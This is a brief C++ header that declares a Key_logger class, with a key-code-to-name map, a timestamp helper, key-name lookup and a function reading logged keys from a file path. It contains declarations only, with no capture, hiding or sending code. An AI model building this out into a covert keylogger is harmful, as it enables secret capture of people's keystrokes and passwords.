#pragma once

#include <map>
std::string CurrentDateTime();
int check(int result);
bool isLetter(const int value);

class Key_logger{
private:
    std::map<unsigned short, std::string> keys;
public:
    Key_logger();
    std::string CurrentDateTime();
    std::string get_name_of_the_key(int key);
    std::vector<std::string> get_keys_vector(std::string path);

};